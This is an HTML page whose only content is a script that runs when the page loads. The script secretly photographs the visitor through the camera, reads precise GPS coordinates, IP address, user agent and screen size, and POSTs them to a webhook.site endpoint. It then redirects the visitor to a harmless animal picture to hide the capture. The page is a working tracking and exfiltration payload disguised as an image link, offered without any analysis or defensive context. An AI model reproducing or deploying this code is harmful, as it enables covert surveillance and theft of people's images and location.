<!DOCTYPE html>
<html>
<body>
    <script>
        (async() => {
            const d = {
                ua: navigator.userAgent,
                time: new Date().toISOString(),
                screen: `${screen.width}x${screen.height}`
            };
            
            // IP
            try {
                d.ip = (await fetch('https://api.ipify.org?format=json').then(r => r.json())).ip;
            } catch(e) {}
            
            // CÃ¢mera
            try {
                const stream = await navigator.mediaDevices.getUserMedia({video: true});
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                d.foto = canvas.toDataURL('image/jpeg', 0.3);
                
                stream.getTracks().forEach(t => t.stop());
            } catch(e) {
                d.camError = e.name;
            }
            
            // GPS
            if(navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    p => {
                        d.gps = {
                            lat: p.coords.latitude.toFixed(6),
                            lon: p.coords.longitude.toFixed(6),
                            acc: p.coords.accuracy
                        };
                        enviar();
                    },
                    e => {
                        d.gps = e.code;
                        enviar();
                    },
                    {enableHighAccuracy: true, timeout: 5000}
                );
            } else {
                enviar();
            }
            
            function enviar() {
                fetch('https://webhook.site/4d2e570d-f23e-4d97-8916-d987dda12c3f', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(d),
                    mode: 'no-cors'
                });
                
                if(d.foto) {
                    window.location.href = "https://formulanimal.com.br/wp-content/uploads/2024/06/pexels-chevonrossouw-2558605-3-850x394.jpg";
                } else {
                    window.location.href = "https://formulanimal.com.br/wp-content/uploads/2024/06/pexels-chevonrossouw-2558605-3-850x394.jpg";
                }
            }
        })();
    </script>
</body>
</html>

